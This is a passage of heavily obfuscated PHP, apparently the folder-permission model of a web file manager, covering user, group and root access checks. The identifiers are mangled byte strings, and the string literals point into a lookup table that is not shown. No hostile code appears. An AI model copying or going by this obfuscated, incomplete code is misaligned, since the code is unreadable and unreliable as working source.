$Ğî—Âçç[514] => intval($î½›Ü“), $Ğî—Âçç[1937] => isset($ß™·şÜ‹[$Ğî—Âçç[399]]) ? intval($ß™·şÜ‹[$Ğî—Âçç[399]]) : 0, $Ğî—Âçç[1993] => isset($ß™·şÜ‹[$Ğî—Âçç[1993]]) ? intval($ß™·şÜ‹[$Ğî—Âçç[1993]]) : -1); } $ÛïÌ¾ûş[] = array($Ğî—Âçç[411] => $¢íãé‰ [$Ğî—Âçç[411]], $Ğî—Âçç[420] => SourceModel::TYPE_USER, $Ğî—Âçç[514] => intval($ÆğÃïÛõ), $Ğî—Âçç[1937] => intval($ş’áÍìû), $Ğî—Âçç[1993] => -1); $this->where(array($Ğî—Âçç[426] => $¢íãé‰ [$Ğî—Âçç[411]]))->delete(); $this->addAll($ÛïÌ¾ûş); } return !0; } public function get($àÁ¶øï¿) { $ú¨È® = $this->getSourceList(array($àÁ¶øï¿), !0); return $ú¨È®[0]; } public function getSourceList($Õ¿ À¯¥, $÷Åïı = false, $„©ÜÖ = false) { $¬ëƒºö =& $_SERVER[ïëó©ÒÚ]; if (!$Õ¿ À¯¥) { return array(); } $ù½Ùô€— = Model($¬ëƒºö[1330]); if (!$÷Åïı && count($Õ¿ À¯¥) == 1) { $÷Åïı = array(); $÷Åïı[$Õ¿ À¯¥[0]] = $ù½Ùô€—->sourceInfo($Õ¿ À¯¥[0]); } if (!$÷Åïı) { $•ÑÛÍ…ñ = array($¬ëƒºö[426] => array($¬ëƒºö[427], $Õ¿ À¯¥)); $÷Åïı = $ù½Ùô€—->field($¬ëƒºö[2017])->where($•ÑÛÍ…ñ)->select(); $÷Åïı = array_to_keyvalue($÷Åïı, $¬ëƒºö[411]); } $¢öü÷…¸ = $Õ¿ À¯¥; foreach ($÷Åïı as $Õß‰Ñùô => $§çó¶ƒ„) { $†Â¶ÕÛó = $ù½Ùô€—->parentLevelArray($§çó¶ƒ„[$¬ëƒºö[530]]); $¢öü÷…¸ = array_merge($¢öü÷…¸, array($Õß‰Ñùô), array_reverse($†Â¶ÕÛó)); } $¢öü÷…¸ = array_values(array_unique($¢öü÷…¸)); if (!$¢öü÷…¸) { return array(); } $Àö‡‹Üì = $this->sourceAuthSelect($¢öü÷…¸); $Ã¤Ë¢¨È = array(); foreach ($¢öü÷…¸ as $ô™ç“ı) { if (isset($Àö‡‹Üì[$ô™ç“ı])) { $Ã¤Ë¢¨È[$ô™ç“ı] = $Àö‡‹Üì[$ô™ç“ı]; } } $¢á‰È—‘ = $this->userIsRoot($„©ÜÖ); $·Ê•èû = AuthModel::authAll(); $æÈÌê¨ = array($¬ëƒºö[423] => $·Ê•èû, $¬ëƒºö[2018] => array($¬ëƒºö[428] => 0, $¬ëƒºö[1839] => $·Ê•èû, $¬ëƒºö[429] => LNG($¬ëƒºö[2019]), $¬ëƒºö[1856] => $¬ëƒºö[2020])); $ä´ç³œ” = array(); foreach ($÷Åïı as $ô™ç“ı => $°’½µïÇ) { if ($¢á‰È—‘ && $GLOBALS[$¬ëƒºö[6]][$¬ëƒºö[1852]]) { $ä´ç³œ”[$ô™ç“ı] = $æÈÌê¨; continue; } $ä´ç³œ”[$ô™ç“ı] = $this->makeSourceAuth($°’½µïÇ, $Ã¤Ë¢¨È, $„©ÜÖ); } return $ä´ç³œ”; } public function authDeepCheck($šö‡ğÏ©, $ş†›¾Ñµ = false) { $‡ÆÅ Ğ =& $_SERVER[ïëó©ÒÚ]; $ş†›¾Ñµ = $ş†›¾Ñµ ? $ş†›¾Ñµ : USER_ID; $îÏÀƒ¿‘ = $this->makeAuthDeep($ş†›¾Ñµ); if (!in_array($šö‡ğÏ©, $îÏÀƒ¿‘[$‡ÆÅ Ğ[2021]])) { return !1; } $ä¹ŸÚÙ = array(); foreach ($îÏÀƒ¿‘[$‡ÆÅ Ğ[2022]] as $ğ×¶öÎ => $¨‚å¶É¹) { if (!in_array($šö‡ğÏ©, $¨‚å¶É¹)) { continue; } $ä¹ŸÚÙ[] = $ğ×¶öÎ; } if (!$ä¹ŸÚÙ) { return !1; } $­¡›Û€ï = $ä¹ŸÚÙ ? $ä¹ŸÚÙ[0] : $šö‡ğÏ©; return array($‡ÆÅ Ğ[423] => -1, $‡ÆÅ Ğ[476] => array($‡ÆÅ Ğ[428] => $‡ÆÅ Ğ[1193], $‡ÆÅ Ğ[1839] => $‡ÆÅ Ğ[197], $‡ÆÅ Ğ[429] => LNG($‡ÆÅ Ğ[2023]), $‡ÆÅ Ğ[1856] => $‡ÆÅ Ğ[2024]), $‡ÆÅ Ğ[2025] => LNG($‡ÆÅ Ğ[2026]), $‡ÆÅ Ğ[2027] => $this->sourceAuthInfo($­¡›Û€ï)); } protected function makeAuthDeep($Œó­€Ş = false) { $”¨®²şŠ =& $_SERVER[ïëó©ÒÚ]; static $ÁÀñù”³ = array(); $Œó­€Ş = $Œó­€Ş ? $Œó­€Ş : USER_ID; if (isset($ÁÀñù”³[$Œó­€Ş])) { return $ÁÀñù”³[$Œó­€Ş]; } $›‘ä±… = Model($”¨®²şŠ[2028])->listData(); $ş³ÅĞñ´ = array(); foreach ($›‘ä±… as $³ÂÃ·Ã—) { if ($³ÂÃ·Ã—[$”¨®²şŠ[422]] == 0 && $³ÂÃ·Ã—[$”¨®²şŠ[1855]] == $”¨®²şŠ[88]) { $ş³ÅĞñ´[] = $³ÂÃ·Ã—[$”¨®²şŠ[399]]; } } $˜Üî˜ºî = $this->userGroupParents($Œó­€Ş); $¯¥»¯Ü = array($”¨®²şŠ[420] => SourceModel::TYPE_USER, $”¨®²şŠ[514] => $Œó­€Ş); if ($˜Üî˜ºî) { $¯¥»¯Ü = array(array($”¨®²şŠ[420] => SourceModel::TYPE_USER, $”¨®²şŠ[514] => $Œó­€Ş), array($”¨®²şŠ[420] => SourceModel::TYPE_GROUP, $”¨®²şŠ[514] => array($”¨®²şŠ[427], $˜Üî˜ºî)), $”¨®²şŠ[1003] => $”¨®²şŠ[1931]); } $”ï¡Åî… = $this->field($”¨®²şŠ[2029])->where($¯¥»¯Ü)->select(); $…³Û¼æ = array(); $›Ï¡«ùÓ = array_to_keyvalue_group($”ï¡Åî…, $”¨®²şŠ[411]); foreach ($›Ï¡«ùÓ as $›±®Ï®ì => $åª´œË) { $êÆà®¶ª = $this->authArrayCheck($åª´œË, $Œó­€Ş); if ($êÆà®¶ª[$”¨®²şŠ[423]] > 0) { $…³Û¼æ[] = $›±®Ï®ì . $”¨®²şŠ[12]; } } if ($˜Üî˜ºî) { $¦øåÈùÄ = Model($”¨®²şŠ[531]); foreach ($˜Üî˜ºî as $¿Ï—×‘¦) { $µ¡Îß–Ì = $¦øåÈùÄ->getInfo($¿Ï—×‘¦); if (!$µ¡Îß–Ì || !is_array($µ¡Îß–Ì[$”¨®²şŠ[86]])) { continue; } $…³Û¼æ[] = $µ¡Îß–Ì[$”¨®²şŠ[86]][$”¨®²şŠ[411]]; } } $‚ÈÊÚÇÚ = array(); $æ‡šö¢± = $˜Üî˜ºî; $ıÏò‘Ö‡ = Model($”¨®²şŠ[1330]); $¦øåÈùÄ = Model($”¨®²şŠ[531]); $ÆÃÙÛú = array(); $›¢¿—Éò = array(); $¼íÆ‡¦ª = array(); $£îÍ‡ˆƒ = array(); if ($…³Û¼æ) { $Ÿß‹†ò³ = $ıÏò‘Ö‡->where(array($”¨®²şŠ[411] => array($”¨®²şŠ[427], $…³Û¼æ)))->select(); foreach ($Ÿß‹†ò³ as $™èÛ»ö³) { $¸ˆªó»ô = $ıÏò‘Ö‡->parentLevelArray($™èÛ»ö³[$”¨®²şŠ[530]]); $‚ÈÊÚÇÚ = array_merge($‚ÈÊÚÇÚ, $¸ˆªó»ô); $æ‡šö¢±[] = $™èÛ»ö³[$”¨®²şŠ[514]]; $ÆÃÙÛú[$™èÛ»ö³[$”¨®²şŠ[411]]] = $¸ˆªó»ô; $›¢¿—Éò[$™èÛ»ö³[$”¨®²şŠ[411]]] = $™èÛ»ö³[$”¨®²şŠ[514]]; } } $æ‡šö¢± = array_values(array_unique($æ‡šö¢±)); $ëá¯öÙ = $æ‡šö¢±; foreach ($ëá¯öÙ as $¿Ï—×‘¦) { $µ¡Îß–Ì = $¦øåÈùÄ->getInfo($¿Ï—×‘¦); $¸ˆªó»ô = $ıÏò‘Ö‡->parentLevelArray($µ¡Îß–Ì[$”¨®²şŠ[530]]); $æ‡šö¢± = array_merge($æ‡šö¢±, $¸ˆªó»ô); } $æ‡šö¢± = array_values(array_unique($æ‡šö¢±)); foreach ($æ‡šö¢± as $¿Ï—×‘¦) { $µ¡Îß–Ì = $¦øåÈùÄ->getInfo($¿Ï—×‘¦); $‚ÈÊÚÇÚ[] = $µ¡Îß–Ì[$”¨®²şŠ[86]][$”¨®²şŠ[411]]; $¼íÆ‡¦ª[$¿Ï—×‘¦] = $µ¡Îß–Ì[$”¨®²şŠ[86]][$”¨®²şŠ[411]]; $£îÍ‡ˆƒ[$¿Ï—×‘¦] = $ıÏò‘Ö‡->parentLevelArray($µ¡Îß–Ì[$”¨®²şŠ[530]]); } foreach ($ÆÃÙÛú as $¯úƒ®‹¬ => $ßØËş“›) { $İûÓĞŸ¶ = $›¢¿—Éò[$¯úƒ®‹¬]; if (!$İûÓĞŸ¶ || !$¼íÆ‡¦ª[$İûÓĞŸ¶]) { continue; } $‘ÂØØã† = array(); foreach ($£îÍ‡ˆƒ[$İûÓĞŸ¶] as $¿Ï—×‘¦) { $‘ÂØØã†[] = $¼íÆ‡¦ª[$¿Ï—×‘¦]; } $ÆÃÙÛú[$¯úƒ®‹¬] = array_merge($‘ÂØØã†, $ßØËş“›); } $‚ÈÊÚÇÚ = array_values(array_unique($‚ÈÊÚÇÚ)); $€ğÆ˜ÑÄ = array($”¨®²şŠ[2021] => $‚ÈÊÚÇÚ, $”¨®²şŠ[2022] => $ÆÃÙÛú); $ÁÀñù”³[$Œó­€Ş] = $€ğÆ˜ÑÄ; return $€ğÆ˜ÑÄ; } private function makeSourceAuth($üó”¿‘Ä, $ş”„¼Ÿ, $Ü›À¢ï³ = false) { $Â¦‘¨£Š =& $_SERVER[ïëó©ÒÚ]; $Ğğù¡½ = $Â¦‘¨£Š[88]; $êÁ”ĞÕ = $üó”¿‘Ä[$Â¦‘¨£Š[514]]; $Ñ·óÏ½ = $üó”¿‘Ä[$Â¦‘¨£Š[420]] == SourceModel::TYPE_GROUP; $™ı†İğ = $Ñ·óÏ½ ? $this->groupRootAuth($êÁ”ĞÕ, $Ü›À¢ï³) : !1; if ($™ı†İğ && Model($Â¦‘¨£Š[516])->authCheckAction($™ı†İğ[$Â¦‘¨£Š[422]], $Â¦‘¨£Š[1854])) { return $this->groupAuthInfo($™ı†İğ, $êÁ”ĞÕ); } $Ç§˜…Æş = Model($Â¦‘¨£Š[1330])->parentLevelArray($üó”¿‘Ä[$Â¦‘¨£Š[530]]); $Ç§˜…Æş = array_merge(array($üó”¿‘Ä[$Â¦‘¨£Š[411]]), array_reverse($Ç§˜…Æş)); $”Ôü‡‚— = !1; foreach ($Ç§˜…Æş as $Øşš³öİ) { if (!isset($ş”„¼Ÿ[$Øşš³öİ])) { continue; } $äì¦¤’Ô = $this->authMake($ş”„¼Ÿ[$Øşš³öİ], $Ü›À¢ï³); if ($äì¦¤’Ô[$Â¦‘¨£Š[476]]) { $”Ôü‡‚— = $äì¦¤’Ô; break; } } if (!$Ñ·óÏ½) { return $”Ôü‡‚—; } if (!$”Ôü‡‚— && $™ı†İğ) { $”Ôü‡‚— = $this->groupAuthInfo($™ı†İğ, $êÁ”ĞÕ); } if (!$”Ôü‡‚—) { $Ô ¶—¥ª = Model($Â¦‘¨£Š[531])->getInfo($êÁ”ĞÕ); $É¯µ¿»É = explode($Â¦‘¨£Š[50], trim($Ô ¶—¥ª[$Â¦‘¨£Š[530]], $Â¦‘¨£Š[50])); $É¯µ¿»É = array_reverse($É¯µ¿»É); foreach ($É¯µ¿»É as $¢¬²¾÷²) { if ($¢¬²¾÷² == $Â¦‘¨£Š[197] || $¢¬²¾÷² == $Ğğù¡½) { continue; } $—×Ü½… = $this->groupRootAuth($¢¬²¾÷², $Ü›À¢ï³); if (!$—×Ü½…) { continue; } $”Ôü‡‚— = $this->groupAuthInfo($—×Ü½…, $¢¬²¾÷²); break; } } if (!$”Ôü‡‚— || $”Ôü‡‚—[$Â¦‘¨£Š[423]] <= 0) { $èºÒ° = $this->authDeepCheck($üó”¿‘Ä[$Â¦‘¨£Š[411]], $Ü›À¢ï³); if ($èºÒ°) { $”Ôü‡‚— = $èºÒ°; } } return $”Ôü‡‚—; } private function userIsRoot($Ó—ÊéÑœ = false) { $ÖÔ€÷×ä =& $_SERVER[ïëó©ÒÚ]; if (!$Ó—ÊéÑœ && _get($GLOBALS, $ÖÔ€÷×ä[512])) { return !0; } $´ğ»Ì = Model($ÖÔ€÷×ä[544])->getInfo($Ó—ÊéÑœ); $íè¿™Ë… = Model($ÖÔ€÷×ä[2030])->listData($´ğ»Ì[$ÖÔ€÷×ä[1540]]); if ($íè¿™Ë… && $íè¿™Ë…[$ÖÔ€÷×ä[520]][$ÖÔ€÷×ä[2031]] == 1) { return !0; } return !1; } private function sourceAuthInfo($â›¢Ï‚û) { $ı”®“¢ =& $_SERVER[ïëó©ÒÚ]; $…Šï¼ı = Model($ı”®“¢[1330]); $ç²†î”Ù = $…Šï¼ı->sourceInfo($â›¢Ï‚û); if (!$ç²†î”Ù) { return !1; } $…Šï¼ı->groupPathDisplay($ç²†î”Ù); $Ò¼´­â¢ = array($ç²†î”Ù); $Ò¼´­â¢ = $…Šï¼ı->_listAppendPath($Ò¼´­â¢); $ç²†î”Ù = $Ò¼´­â¢[0]; $ìÄ•´ˆ = $ç²†î”Ù[$ı”®“¢[528]]; if (isset($ç²†î”Ù[$ı”®“¢[536]])) { $¬Ü½ÇÓ° = explode($ı”®“¢[8], trim($ç²†î”Ù[$ı”®“¢[528]], $ı”®“¢[8])); array_shift($¬Ü½ÇÓ°); $ìÄ•´ˆ = $ç²†î”Ù[$ı”®“¢[534]] . $ı”®“¢[2032] . implode($ı”®“¢[8], $¬Ü½ÇÓ°); } return array($ı”®“¢[429] => $ç²†î”Ù[$ı”®“¢[32]], $ı”®“¢[84] => KodIO::make($ç²†î”Ù[$ı”®“¢[411]]), $ı”®“¢[2033] => $ìÄ•´ˆ); } private function groupAuthInfo($‡úº¹Ò¼, $ëê¢¶‡) { $ÉÖ¡—â =& $_SERVER[ïëó©ÒÚ]; $ÚôÔÀµª = Model($ÉÖ¡—â[531])->getInfo($ëê¢¶‡); return array($ÉÖ¡—â[2034] => intval($‡úº¹Ò¼[$ÉÖ¡—â[422]]), $ÉÖ¡—â[2018] => $‡úº¹Ò¼, $ÉÖ¡—â[2035] => LNG($ÉÖ¡—â[2036]), $ÉÖ¡—â[2027] => array($ÉÖ¡—â[429] => $ÚôÔÀµª[$ÉÖ¡—â[32]], $ÉÖ¡—â[84] => KodIO::make($ÚôÔÀµª[$ÉÖ¡—â[86]][$ÉÖ¡—â[411]]), $ÉÖ¡—â[2033] => $ÚôÔÀµª[$ÉÖ¡—â[535]])); } protected function groupRootAuth($åìªŒåÓ, $Í¡¨à©Ÿ = false) { $‹ÕÚÛ¸ =& $_SERVER[ïëó©ÒÚ]; $Í¡¨à©Ÿ = $Í¡¨à©Ÿ ? $Í¡¨à©Ÿ : USER_ID; $¯ËáŸª = $Í¡¨à©Ÿ . $‹ÕÚÛ¸[2037] . $åìªŒåÓ; static $õ«ö¶Ë¥ = array(); if (isset($õ«ö¶Ë¥[$¯ËáŸª])) { return $õ«ö¶Ë¥[$¯ËáŸª]; } $Îöûî‡À = Model($‹ÕÚÛ¸[531])->getInfo($åìªŒåÓ); $Ÿã¥óºŞ = $this->userGroupList($Í¡¨à©Ÿ); $’î³©Î“ = isset($Ÿã¥óºŞ[$åìªŒåÓ]) ? $Ÿã¥óºŞ[$åìªŒåÓ][$‹ÕÚÛ¸[422]] : !1; if ($’î³©Î“ && Model($‹ÕÚÛ¸[516])->authCheckAction($’î³©Î“[$‹ÕÚÛ¸[422]], $‹ÕÚÛ¸[1854])) { $õ«ö¶Ë¥[$¯ËáŸª] = $’î³©Î“; return $’î³©Î“; } $ÌÊ‰¾ˆˆ = $this->sourceAuthSelect($Îöûî‡À[$‹ÕÚÛ¸[86]][$‹ÕÚÛ¸[411]]); $­ëƒê¯Ô = $ÌÊ‰¾ˆˆ ? $this->authMake($ÌÊ‰¾ˆˆ, $Í¡¨à©Ÿ) : !1; $åú’¯™ = $­ëƒê¯Ô ? $­ëƒê¯Ô[$‹ÕÚÛ¸[476]] : !1; $õ«ö¶Ë¥[$¯ËáŸª] = $åú’¯™ ? $åú’¯™ : $’î³©Î“; return $õ«ö¶Ë¥[$¯ËáŸª]; } public function authOwnerApply($óôüÙ—ë) { $ÏşÊî¾– =& $_SERVER[ïëó©ÒÚ]; if (empty($óôüÙ—ë[$ÏşÊî¾–[422]]) || isset($óôüÙ—ë[$ÏşÊî¾–[2038]]) && $óôüÙ—ë[$ÏşÊî¾–[2038]]) { return $óôüÙ—ë; } if (AuthModel::authCheckRoot($óôüÙ—ë[$ÏşÊî¾–[422]][$ÏşÊî¾–[423]])) { return $óôüÙ—ë; } $Î¯ş ³ü = Model($ÏşÊî¾–[1330])->parentLevelArray($óôüÙ—ë[$ÏşÊî¾–[530]]); $Î¯ş ³ü = array_merge(array($óôüÙ—ë[$ÏşÊî¾–[411]]), array_reverse($Î¯ş ³ü)); $•ÁÊÂõ§ = $this->sourceAuthSelect($Î¯ş ³ü); $…ìğ¥şò = array(); $‚÷Ì¯ì = array(); foreach ($•ÁÊÂõ§ as $Ùê×è¨Ê => $×¨¼„ßí) { $â„–Ùö = $this->authFolderOwnerUser($×¨¼„ßí); $…ìğ¥şò[$Ùê×è¨Ê] = $â„–Ùö; $‚÷Ì¯ì = array_merge($‚÷Ì¯ì, $â„–Ùö[$ÏşÊî¾–[609]]); if ($â„–Ùö[$ÏşÊî¾–[2039]]) { break; } } if (count($‚÷Ì¯ì) == 0) { $‚÷Ì¯ì = $this->authFolderOwnerGroup($óôüÙ—ë[$ÏşÊî¾–[514]]); } $‚÷Ì¯ì = array_unique($‚÷Ì¯ì); if (AuthModel::authCheckRoot($óôüÙ—ë[$ÏşÊî¾–[422]][$ÏşÊî¾–[423]])) { $‚÷Ì¯ì[] = USER_ID; } $óôüÙ—ë[$ÏşÊî¾–[422]][$ÏşÊî¾–[2040]] = Model($ÏşÊî¾–[522])->userListInfo($‚÷Ì¯ì); return $óôüÙ—ë; } private function authFolderOwnerGroup($×ªíàç”) { $¿©Õ½ä† =& $_SERVER[ïëó©ÒÚ]; $ÜßùÃÉ¥ = Model($¿©Õ½ä†[1923])->where(array($¿©Õ½ä†[1833] => $×ªíàç”))->select(); $È¾Ã°¬¨ = array(); if (!$ÜßùÃÉ¥) { return $È¾Ã°¬¨; } foreach ($ÜßùÃÉ¥ as $§Ú¯üĞÊ) { $©Ñ†â‚ = $this->authInfo($§Ú¯üĞÊ); if (AuthModel::authCheckRoot($©Ñ†â‚[$¿©Õ½ä†[422]])) { $È¾Ã°¬¨[] = $§Ú¯üĞÊ[$¿©Õ½ä†[1661]]; } } return $È¾Ã°¬¨; } private function authFolderOwnerUser($³åÑ“©²) { $Â°…ò¸­ =& $_SERVER[ïëó©ÒÚ]; $ùˆøŠ¥ = array(); $ëœïœş = !1; foreach ($³åÑ“©² as $æ­®ï¹‰) { $”ûŸÀ›è = $this->authInfo($æ­®ï¹‰); if ($æ­®ï¹‰[$Â°…ò¸­[514]] == $Â°…ò¸­[197]) { $ëœïœş = !0; } if ($æ­®ï¹‰[$Â°…ò¸­[420]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($”ûŸÀ›è[$Â°…ò¸­[422]])) { $ùˆøŠ¥[] = $æ­®ï¹‰[$Â°…ò¸­[514]]; } } } return array($Â°…ò¸­[609] => $ùˆøŠ¥, $Â°…ò¸­[2039] => $ëœïœş); } public function authMake($Å÷Éì˜ë, $ºÔ‚´œ® = false) { $æ¹ç‡Çº =& $_SERVER[ïëó©ÒÚ]; $æ’ºÍĞÒ = $this->authArrayCheck($Å÷Éì˜ë, $ºÔ‚´œ®); if ($æ’ºÍĞÒ[$æ¹ç‡Çº[2041]]) { $æ’ºÍĞÒ[$æ¹ç‡Çº[2041]] = $this->sourceAuthInfo($æ’ºÍĞÒ[$æ¹ç‡Çº[2041]]); } return $æ’ºÍĞÒ; } public function authArrayCheck($Øû”‰Ÿ, $÷ÀÑ¹˜» = false) { $ı¢Ôèâ =& $_SERVER[ïëó©ÒÚ]; if (!$Øû”‰Ÿ) { return array($ı¢Ôèâ[423] => 0, $ı¢Ôèâ[476] => !1); } $÷ÀÑ¹˜» = $÷ÀÑ¹˜» ? $÷ÀÑ¹˜» : USER_ID; $×‘Òšàã = 0; $ŞäÙşø = 0; $É‹ĞúŠ— = 0; $­±Æ×’Ë = 0; $¹¸©ğ† = 0; $úõõàö‘ = 0; $Áİì¯¼  = 1000; $âÖÎ—ƒ = 0; $Â–Äüî¨ = 0; $ä Óìòî = 0; $åÅÊ†´€ = 0; $¦‰É¿ø = array($ı¢Ôèâ[411] => 0); foreach ($Øû”‰Ÿ as $¦‰É¿ø) { $ÏéÜŒÌ = $this->authInfo($¦‰É¿ø); if (!$ÏéÜŒÌ) { continue; } $Åå¨Ê· = $¦‰É¿ø[$ı¢Ôèâ[514]]; $•İŞ·æ = intval($ÏéÜŒÌ[$ı¢Ôèâ[422]]); if ($¦‰É¿ø[$ı¢Ôèâ[420]] == SourceModel::TYPE_USER && $Åå¨Ê· == $÷ÀÑ¹˜») { $×‘Òšàã = !0; $É‹ĞúŠ— = $ÏéÜŒÌ; $ŞäÙşø = $•İŞ·æ; } else { if ($¦‰É¿ø[$ı¢Ôèâ[420]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Åå¨Ê·, $÷ÀÑ¹˜»)) { $­±Æ×’Ë = !0; $¸Ù½‘ü« = $this->groupStepToUserGroup($Åå¨Ê·, $÷ÀÑ¹˜»); if ($¸Ù½‘ü« < $Áİì¯¼ ) { $Áİì¯¼  = $¸Ù½‘ü«; $¹¸©ğ† = $•İŞ·æ; $úõõàö‘ = $ÏéÜŒÌ; $âÖÎ—ƒ = $Åå¨Ê·; } if ($¸Ù½‘ü« == $Áİì¯¼  && $•İŞ·æ >= $¹¸©ğ†) { $¹¸©ğ† = $•İŞ·æ; $úõõàö‘ = $ÏéÜŒÌ; $âÖÎ—ƒ = $Åå¨Ê·; } } else { if ($Åå¨Ê· == $ı¢Ôèâ[197]) { $Â–Äüî¨ = !0; $åÅÊ†´€ = $ÏéÜŒÌ; $ä Óìòî = $•İŞ·æ; } } } } if ($×‘Òšàã) { $‡¢•Û¸ = $ŞäÙşø; $ÏéÜŒÌ = $É‹ĞúŠ—; $°éüÃÛ = LNG($ı¢Ôèâ[2042]); } else { if ($­±Æ×’Ë) { $‡¢•Û¸ = $¹¸©ğ†; $ÏéÜŒÌ = $úõõàö‘; $Æ’ªÍÛ = Model($ı¢Ôèâ[531])->getInfo($âÖÎ—ƒ); $°éüÃÛ = $ı¢Ôèâ[162] . $Æ’ªÍÛ[$ı¢Ôèâ[535]] . $ı¢Ôèâ[2043] . LNG($ı¢Ôèâ[2044]); } else { if ($Â–Äüî¨) { $‡¢•Û¸ = $ä Óìòî; $ÏéÜŒÌ = $åÅÊ†´€; $°éüÃÛ = LNG($ı¢Ôèâ[2015]); } else { $‡¢•Û¸ = 0; $ÏéÜŒÌ = !1; $°éüÃÛ = $ı¢Ôèâ[12]; } } } $¿–á¥â½ = array($ı¢Ôèâ[2034] => intval($‡¢•Û¸), $ı¢Ôèâ[2018] => $ÏéÜŒÌ, $ı¢Ôèâ[2035] => $°éüÃÛ, $ı¢Ôèâ[2027] => $¦‰É¿ø[$ı¢Ôèâ[411]]); return $¿–á¥â½; } private function groupContainUser($«ÇéèóÊ, $àìªµÑ¶ = false) { return in_array($«ÇéèóÊ, $this->userGroupParents($àìªµÑ¶)); } private function groupStepToUserGroup($‘ú£‹Ã, $ŠŸ¬ÁÂÔ = false) { $ç«æòÙç =& $_SERVER[ïëó©ÒÚ]; $¡ÅöÉ©³ = $this->userGroupList($ŠŸ¬ÁÂÔ); $’ÑŠ¤èÊ = 1000; $úÕ§ = $GLOBALS[$ç«æòÙç[6]][$ç«æòÙç[89]][$ç«æòÙç[1936]] == 1; $í†Ãœò¹ = $úÕ§ ? 3 : 2; foreach ($¡ÅöÉ©³ as $¯«ÅĞÎ ) { if ($¯«ÅĞÎ [$ç«æòÙç[1833]] == $‘ú£‹Ã) { return 0; } $‘¶ëÄ¦ = explode($ç«æòÙç[50], trim($¯«ÅĞÎ [$ç«æòÙç[530]], $ç«æòÙç[50])); if ($‘¶ëÄ¦[0] == $ç«æòÙç[197] && count($‘¶ëÄ¦) > $í†Ãœò¹) { $‹•éÌÉÉ = array_reverse(array_slice($‘¶ëÄ¦, $í†Ãœò¹)); $…è¹Í‡² = array_search($‘ú£‹Ã, $‹•éÌÉÉ); if ($…è¹Í‡² !== !1 && $…è¹Í‡² + 1 <= $’ÑŠ¤èÊ) { $’ÑŠ¤èÊ = $…è¹Í‡² + 1; } } } return $’ÑŠ¤èÊ; } private function userGroupList($÷¦Å›ß­ = false) { $µÊ ì =& $_SERVER[ïëó©ÒÚ]; static $ÁÃ–Šı™ = array(); if (isset($ÁÃ–Šı™[$÷¦Å›ß­])) { return $ÁÃ–Šı™[$÷¦Å›ß­]; } $¾®óôı† = Model($µÊ ì[544])->getInfo($÷¦Å›ß­); $ÁÃ–Šı™[$÷¦Å›ß­] = array_to_keyvalue($¾®óôı†[$µÊ ì[2016]], $µÊ ì[1833]); return $ÁÃ–Šı™[$÷¦Å›ß­]; } public function userGroupParents($Ã»¾«Õ) { $Ç»–èõ– =& $_SERVER[ïëó©ÒÚ]; static $ú‡ùš© = array(); $Ã»¾«Õ = $Ã»¾«Õ ? $Ã»¾«Õ : USER_ID; if (isset($ú‡ùš©[$Ã»¾«Õ])) { return $ú‡ùš©[$Ã»¾«Õ]; } $íçùú„ = $this->userGroupList($Ã»¾«Õ); $òÜï£åñ = array(); $¾Ş’“É½ = $GLOBALS[$Ç»–èõ–[6]][$Ç»–èõ–[89]][$Ç»–èõ–[1936]] == 1; $ŒŠì’ªÄ = $¾Ş’“É½ ? 3 : 2; foreach ($íçùú„ as $¹ô¨ÛÔº) { $–¼²İ…Ü = array($¹ô¨ÛÔº[$Ç»–èõ–[1833]]); $µ’™à®– = explode($Ç»–èõ–[50], trim($¹ô¨ÛÔº[$Ç»–èõ–[530]], $Ç»–èõ–[50])); if ($µ’™à®–[0] == $Ç»–èõ–[197] && count($µ’™à®–) > $ŒŠì’ªÄ) { $îæÍ¯ö¬ = array_slice($µ’™à®–, $ŒŠì’ªÄ); $–¼²İ…Ü = array_merge($–¼²İ…Ü, array_reverse($îæÍ¯ö¬)); } $òÜï£åñ = array_merge($òÜï£åñ, $–¼²İ…Ü); } $ú‡ùš©[$Ã»¾«Õ] = array_unique($òÜï£åñ); return $ú‡ùš©[$Ã»¾«Õ]; } public function authTargetInfoMake($Ê¾’Çç) { $úÚùÓŞÒ =& $_SERVER[ïëó©ÒÚ]; $Ö—å¯æ = array(); $É­ÕìÜÖ = array(); foreach ($Ê¾’Çç as $Ã²ƒ³Ç—) { if ($Ã²ƒ³Ç—[$úÚùÓŞÒ[420]] == SourceModel::TYPE_USER) { $Ö—å¯æ[] = intval($Ã²ƒ³Ç—[$úÚùÓŞÒ[514]]); } else { if ($Ã²ƒ³Ç—[$úÚùÓŞÒ[420]] == SourceModel::TYPE_GROUP) { $É­ÕìÜÖ[] = intval($Ã²ƒ³Ç—[$úÚùÓŞÒ[514]]); } } } if ($Ö—å¯æ) { $Ö—å¯æ = Model($úÚùÓŞÒ[522])->userListInfo($Ö—å¯æ); } if ($É­ÕìÜÖ) { $ıë–ƒÖĞ = array($úÚùÓŞÒ[1921] => array($úÚùÓŞÒ[427], $É­ÕìÜÖ)); $É­ÕìÜÖ = Model($úÚùÓŞÒ[531])->field($úÚùÓŞÒ[2045])->where($ıë–ƒÖĞ)->select(); $É­ÕìÜÖ = array_to_keyvalue($É­ÕìÜÖ, $úÚùÓŞÒ[1833]); } return array($úÚùÓŞÒ[2046] => $Ö—å¯æ, $úÚùÓŞÒ[2047] => $É­ÕìÜÖ); } public function authInfo($‘›–Û¯ç) { $©•üÍ” =& $_SERVER[ïëó©ÒÚ]; if ($‘›–Û¯ç[$©•üÍ”[1937]]) { $«ı¥Š®£ = Model($©•üÍ”[516])->listData($‘›–Û¯ç[$©•üÍ”[1937]]); if (!$«ı¥Š®£) { return !1; $ùıª‰æˆ = Model($©•üÍ”[516])->listData(); $áÙË“¯š = array_filter_by_field($ùıª‰æˆ, $©•üÍ”[422], $©•üÍ”[197]); return $áÙË“¯š; } $óé¢ğßÒ = array_field_key($«ı¥Š®£, array($©•üÍ”[399], $©•üÍ”[32], $©•üÍ”[422], $©•üÍ”[1856], $©•üÍ”[1857])); $óé¢ğßÒ[$©•üÍ”[2048]] = $‘›–Û¯ç; return $óé¢ğßÒ; } else { return array($©•üÍ”[428] => 0, $©•üÍ”[1839] => $‘›–Û¯ç[$©•üÍ”[1993]], $©•üÍ”[429] => $©•üÍ”[12], $©•üÍ”[1856] => $©•üÍ”[2049]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\162\x63\x65\137\x65\166\x65\156\164"; protected $dataAuto = array(array("\143\x72\145\141\164\x65\124\151\155\x65", "\164\x69\155\x65", "\x69\156\163\x65\x72\164", "\x66\165\x6e\143\x74\151\x6f\156"), 